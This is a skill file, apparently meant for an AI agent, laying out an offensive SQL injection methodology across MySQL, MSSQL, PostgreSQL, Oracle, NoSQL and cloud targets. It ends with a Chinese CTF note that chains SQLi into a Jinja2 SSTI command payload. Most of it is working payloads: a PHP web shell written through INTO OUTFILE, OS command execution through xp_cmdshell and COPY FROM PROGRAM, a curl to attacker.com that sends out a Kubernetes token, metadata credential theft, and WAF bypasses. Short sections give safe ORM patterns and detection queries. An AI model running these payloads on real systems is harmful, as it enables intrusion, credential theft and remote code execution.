---
name: offensive-sqli
description: SQL injection testing skill for offensive security assessments and bug
  bounty hunting. Covers error-based, UNION-based, boolean/time-based blind, out-of-band,
  second-order, NoSQL, GraphQL, WebSocket, and JSON-operator SQLi. Includes WAF bypass
  techniques, database-specific exploitation (MySQL, MSSQL, PostgreSQL, Oracle), cloud-native
  attack paths, ORM CVE tracking, and SQLmap automation. Use when performing web application
  SQL injection testing, database enumeration, privilege escalation via SQLi, or assessing
  injection vectors in APIs and modern stacks.
---

# SQL Injection — Offensive Testing Methodology

## Quick Workflow

1. Map all input vectors that reach the database (URL params, POST body, cookies, headers, API filters, WebSocket messages)
2. Insert probe payloads to detect classic SQLi; fall back to inferential (boolean/time-based) if no visible error
3. Identify database type and enumerate schema
4. Exploit to extract data, escalate privileges, or achieve RCE where in scope
5. Document findings and suggest remediation

---

## Detection

### Basic Probes — All Input Vectors

```
' " ; -- /* */ # ) ( + , \  %
' OR '1'='1
" OR "1"="1
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```

### Error-Based Detection

Trigger syntax errors to reveal database type and query structure:

```
'  ''  `  "  ""  ,  %  \
```

Look for: SQL syntax errors, DB version strings, table/column names leaked in responses.

### Boolean-Based Blind

```sql
' OR 1=1 --
' OR 1=2 --
' AND 1=1 --
' AND 1=2 --
```

Observe response size/content differences between true and false conditions.

### Time-Based Blind

```sql
-- MySQL
' OR SLEEP(5) --
-- PostgreSQL
' OR pg_sleep(5) --
-- MSSQL
' WAITFOR DELAY '0:0:5' --
-- Oracle
'; BEGIN DBMS_LOCK.SLEEP(5); END; --
```

### JSON Operator Probes

```sql
-- MySQL
id=1 AND JSON_EXTRACT('{"a":1}', '$.a')=1
-- PostgreSQL
id=1 AND '{"a":1}'::jsonb ? 'a'
```

### GraphQL → SQLi Pivot

```
{"query":"query{ users(filter: \"' OR 1=1 --\"){ id email }}"}
```

### WebSocket SQLi

```javascript
const ws = new WebSocket("wss://target.com/api/search");
ws.send('{"action":"search","query":"test\\\' OR 1=1--"}');
```

### REST API Filter Injection

```json
POST /api/users/search
{
  "filter": { "name": {"$regex": "admin' OR 1=1--"} },
  "sort": "name'; DROP TABLE users--"
}
```

---

## Automation Workflow

```bash
# Full pipeline
sublist3r -d target | tee domains
cat domains | httpx | tee alive
cat alive | waybackurls | tee urls
gf sqli urls >> sqli
sqlmap -m sqli --dbs --batch

# Targeted with Burp capture
# 1. Capture request → Send to Active Scanner
# 2. Review SQL findings → manually verify
# 3. Export request file → sqlmap -r req.txt --dbs

# Blind SQLi (Ghauri — faster for time-based)
ghauri -u "https://target.com/page?id=1" --dbs

# Hidden parameter discovery
hakrawler -url https://target.com | tee crawl
arjun -i crawl -oJ params.json
```

---

## Exploitation

### Determine Column Count (UNION)

```sql
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -
```

### Identify String Columns

```sql
' UNION SELECT 'a',NULL,NULL-- -
' UNION SELECT NULL,'a',NULL-- -
```

### Enumerate Schema

```sql
-- DB version
' UNION SELECT @@version --          -- MySQL/MSSQL
' UNION SELECT version() --          -- PostgreSQL
' UNION SELECT banner FROM v$version -- -- Oracle

-- Tables
' UNION SELECT table_name,1 FROM information_schema.tables --    -- MySQL/MSSQL/PG
' UNION SELECT table_name,1 FROM all_tables --                   -- Oracle

-- Columns
' UNION SELECT column_name,1 FROM information_schema.columns WHERE table_name='users' --
```

### Blind Data Extraction

```sql
-- Boolean character-by-character
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 0,1)='a'-- -

-- Time-based conditional
' AND (SELECT CASE WHEN (username='admin') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users)-- -
```

---

## Database-Specific Exploitation

### MySQL / MariaDB

```sql
-- File read
' UNION SELECT LOAD_FILE('/etc/passwd') --

-- Write web shell
' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php' --

-- Schema leak
' UNION SELECT table_schema,table_name FROM information_schema.tables
  WHERE table_schema NOT IN ('mysql','information_schema') --
```

### MSSQL

```sql
-- OS command execution
'; EXEC xp_cmdshell 'net user' --

-- Registry read
'; EXEC xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows NT\CurrentVersion','ProductName' --

-- Linked server pivot
'; EXEC ('SELECT * FROM OPENROWSET(''SQLOLEDB'',''Server=linked_server;Trusted_Connection=yes'',''SELECT 1'')') --
```

### PostgreSQL

```sql
-- File read
' UNION SELECT pg_read_file('/etc/passwd',0,1000) --

-- OS command execution
'; CREATE TABLE cmd_exec(cmd_output text);
  COPY cmd_exec FROM PROGRAM 'id';
  SELECT * FROM cmd_exec; --

-- K8s service account token exfil
'; COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)'; --
```

### Oracle

```sql
-- Privilege enumeration
' UNION SELECT * FROM SYS.USER_ROLE_PRIVS --

-- PL/SQL execution
' BEGIN DBMS_JAVA.RUNJAVA('java.lang.Runtime.getRuntime().exec(''cmd.exe /c dir'')'); END; --
```

---

## NoSQL & Graph Injection

### MongoDB

```
username[$ne]=admin&password[$ne]=
username[$regex]=^adm&password[$regex]=^pass
{"$where": "sleep(5000)"}
{"username": {"$in": ["admin"]}}
```

### Neo4j / Cypher (CVE-2024-34517)

```cypher
-- Normal
MATCH (u:User) WHERE u.name = 'admin' RETURN u
-- Bypass
MATCH (u:User) WHERE u.name = 'admin' OR 1=1 //--' RETURN u
```

Older Neo4j 5.x (<5.18 / <4.4.26) allowed privilege escalation via IMMUTABLE procedures.

---

## WAF Bypass Techniques

| Technique | Example |
|-----------|---------|
| Case variation | `SeLeCt`, `UnIoN` |
| Comment injection | `UN/**/ION SE/**/LECT` |
| URL encoding | `UNION` → `%55%4E%49%4F%4E` |
| Hex encoding | `SELECT` → `0x53454C454354` |
| Whitespace | `UNION/**/SELECT` |
| Null byte | `%00' UNION SELECT password FROM users--` |
| Double encoding | `%2f` → `%252f` |
| String concat | MySQL: `CONCAT('a','b')`, Oracle: `'a'\|\|'b'`, MSSQL: `'a'+'b'` |
| JSON wrapper | Prefix with dummy JSON `/**/{"a":1}` to confuse WAF parsers |

**SQLmap tamper scripts:** Use the Atlas tool to suggest tampers; combine multiple (`--tamper=space2comment,charencode`) for layered WAFs.

**HTTP/2 smuggling:** Replay payloads over h2/h2c; HPACK compression can obscure payloads from perimeter WAFs.

---

## Cloud-Specific Attack Paths

### AWS

```sql
-- IMDSv1 credential theft (legacy environments)
' UNION SELECT LOAD_FILE('http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name') --

-- RDS Proxy disruption
'; CALL mysql.rds_kill(CONNECTION_ID()); --
```

### Azure

```sql
-- Azure SQL Managed Instance RCE
'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --
'; EXEC xp_cmdshell 'az vm list'; --

-- Instance metadata
' UNION SELECT LOAD_FILE('http://169.254.169.254/metadata/instance?api-version=2021-02-01') --
```

### GCP Cloud SQL

```sql
' UNION SELECT @@global.version_comment, @@hostname --
```

### Lambda / Serverless Connection Pool Poisoning

```javascript
// SET ROLE persists across Lambda invocations when DB connections are reused
exports.handler = async (event) => {
  await db.query(`SET ROLE '${event.role}'`); // injectable — poisons pool
  return await db.query("SELECT * FROM sensitive_data");
};
```

---

## ORM CVE Tracking (2023–2025)

| ORM | CVE / Issue | Vulnerable Pattern |
|-----|------------|-------------------|
| Sequelize | CVE-2023-22578 | `sequelize.literal(\`name = '${userInput}'\`)` |
| TypeORM <0.3.12 | findOne injection | `repository.findOne({ where: \`id = ${id}\` })` |
| Hibernate 6.x | Query cache poisoning | `session.createQuery("FROM User WHERE name = '" + input + "'")` |
| Prisma <4.11 | Raw query | `prisma.$executeRawUnsafe(\`SELECT * FROM users WHERE id = ${id}\`)` |

**Safe ORM patterns:**

```javascript
// Sequelize — use replacements
sequelize.query('SELECT * FROM users WHERE name = :name', { replacements: { name: user } })
// Prisma — tagged template literal
await prisma.$queryRaw`SELECT * FROM users WHERE name = ${user}`
// Knex
knex('users').whereRaw('name = ?', [user])
```

---

## Quick-Reference Cheatsheet

| DB | Version | Time Delay | String Concat | Schema Source |
|----|---------|-----------|--------------|---------------|
| MySQL | `@@version` | `SLEEP(5)` | `CONCAT('a','b')` | `information_schema.tables` |
| MSSQL | `@@version` | `WAITFOR DELAY '0:0:5'` | `'a'+'b'` | `information_schema.tables`, `sys.tables` |
| PostgreSQL | `version()` | `pg_sleep(5)` | `'a'\|\|'b'` | `information_schema.tables` |
| Oracle | `banner FROM v$version` | `DBMS_PIPE.RECEIVE_MESSAGE('RDS',5)` | `'a'\|\|'b'` | `all_tables`, `all_tab_columns` |

---

## Detection & Monitoring Queries

**Splunk:**

```spl
index=web sourcetype=access_combined
| regex _raw="(%27)|(\\')|(\\-\\-)|((%3D)|(=))[^\\n]*((%27)|(\\')|(\\-\\-)|(\\%3D))"
| eval suspected_sqli=if(match(_raw,"(?i)(union|select|insert|update|delete|drop|create|alter|exec)"),"high","low")
| where suspected_sqli="high"
| table _time, src_ip, uri, user_agent, status
```

**AWS CloudWatch Insights (RDS):**

```
fields @timestamp, @message
| filter @message like /(?i)(UNION|SELECT.*FROM|INSERT INTO|UPDATE.*SET|DELETE FROM)/
| filter @message like /(%27|'|--|\\/\\*)/
| stats count() by bin(5m)
```

---

## Key References

- MITRE ATT&CK: T1190 (Exploit Public-Facing Application)
- OWASP ASVS 4.0: V5.3.4 — parameterized queries required
- PCI DSS 4.0: Requirement 6.2.4 — injection protection mandatory
- CISA KEV Catalog — monitor for actively exploited SQLi CVEs
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/sql-injection.md


---

# 实测武器：SQLi → 读明文 → SSTI 链（TSec 2026-08-03 a-11 实测）

## UNION 读管理员明文 → 登录 → SSTI

```bash
# ① /dashboard?search_query= UNION 注入读出 admin 明文密码
# ② 登录 /admin 后找模板参数注入点，打 Jinja2 SSTI
{{ config.__class__.__init__.__globals__['os'].popen('cat /challenge/flag.txt').read() }}
```

- **响应特征**：模板渲染输出命令结果
- **思路**：SQLi 不一定要直接读 flag，读出管理员凭据登录后台往往有更多入口（SSTI/文件上传/导入导出）
